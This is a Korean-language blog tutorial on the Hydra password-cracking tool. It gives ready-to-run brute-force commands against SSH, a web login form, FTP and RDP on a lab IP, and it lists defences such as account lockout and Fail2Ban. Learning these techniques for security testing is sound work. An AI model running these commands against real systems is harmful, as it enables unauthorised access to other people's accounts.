---
layout: post
title: "Hydra (Online Password Cracking)"
date: 2025-08-28 17:00:00 +0900
categories: [hacking-tools]
tags: [Hydra, Brute Force, Password Cracking, Hacking Tool]
description: "Hydra를 이용한 SSH, FTP, Web Form 로그인 크래킹 방법과 방어 대책"
---

## 1. 개요

**Hydra**는 네트워크 로그인 서비스에 대해 무차별 대입(Brute-Force) 및 사전 공격(Dictionary Attack)을 가장 빠르고 효과적으로 수행하는 도구이다.
SSH, FTP, RDP, HTTP-Form, DB 등 50개 이상의 다양한 프로토콜을 지원하며, 멀티스레드 기반의 병렬 연결을 통해 짧은 시간 안에 유효한 계정 정보를 찾아낼 수 있다.
본 글에서는 Hydra의 기본 옵션을 익히고, 실제 인프라 환경에서 가장 빈번하게 공격 대상이 되는 SSH와 웹 로그인 폼에 대한 크래킹 실습을 진행한다.

---

## 2. 기본 사용법

Hydra의 기본 구문은 다음과 같다.

```bash
hydra [옵션] [대상 IP] [프로토콜] [모듈 옵션]
```

### 주요 옵션
*   **-l [username]**: 단일 사용자 ID 지정
*   **-L [file]**: 사용자 ID 목록(사전 파일) 지정
*   **-p [password]**: 단일 비밀번호 지정
*   **-P [file]**: 비밀번호 목록(사전 파일) 지정
*   **-t [tasks]**: 동시 연결 스레드 수 (기본값: 16)
*   **-v / -V**: 상세 정보 출력 (`-V`는 모든 시도 과정을 보여줌)
*   **-f**: 첫 번째 유효 계정을 찾으면 즉시 공격 중단

---

## 3. 공격 실습: SSH

가장 기본적인 SSH 서비스에 대한 공격이다. 대규모 사전 파일(`rockyou.txt`)을 사용하여 `user` 계정의 비밀번호를 크랙한다.

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 192.9.200.11 ssh
```

![HydraSsh](/assets/images/hacking-tools/Hydra_1.png)

성공 시 녹색 텍스트로 `login: user password: ...` 와 같이 유효한 자격 증명이 출력된다.

---

## 4. 공격 실습: 웹 로그인 폼

웹 애플리케이션의 HTML 로그인 폼에 대해서도 공격이 가능하다. `http-post-form` 모듈을 사용하며, 전송할 패킷 구조를 정확히 지정해야 한다.

### 1. 요청 구조 파악
Burp Suite 등으로 로그인 요청 패킷을 분석하여 다음 3가지 정보를 확인한다.
1.  **로그인 페이지 URL**: `/login.php`
2.  **전송 파라미터**: `username=^USER^&password=^PASS^&Login=Login`
    *   `^USER^`, `^PASS^`는 Hydra가 대입할 값의 위치를 지정하는 변수이다.
3.  **실패 메시지**: `Login failed` (로그인 실패 시 화면에 출력되는 문자열)

### 2. 공격 실행
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.9.200.11 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

![HydraWeb](/assets/images/hacking-tools/Hydra_WebForm.png)

---

## 5. 공격 실습: FTP & RDP

### FTP 서비스
아이디와 비밀번호 모두 사전 파일을 사용하여 `Any:Any` 조합을 찾는다.
```bash
hydra -L users.txt -P pass.txt ftp://192.9.200.11
```

### RDP (원격 데스크톱)
RDP는 연결 속도가 느리고 리소스 소모가 크므로 타임아웃(`-W`)과 스레드(`-t`)를 보수적으로 설정해야 한다.
```bash
hydra -l Administrator -P pass.txt -t 1 -W 5 rdp://192.9.200.11
```

---

## 6. 보안 대책

*   **계정 잠금 정책 (Account Lockout)**: 5회 이상 로그인 실패 시 계정을 잠그거나 로그인 시도를 지연시킨다.
*   **Fail2Ban 사용**: 로그를 실시간으로 모니터링하여 반복적인 실패 시도가 감지된 IP를 방화벽에서 즉시 차단한다.
*   **기본 포트 변경**: SSH(22), RDP(3389) 등 잘 알려진 포트를 변경하여 자동화 봇넷의 스캔을 회피한다.
*   **SSH 키 인증**: 비밀번호 인증을 비활성화하고, SSH Key 쌍을 이용한 인증 방식만 허용한다.

<hr class="short-rule">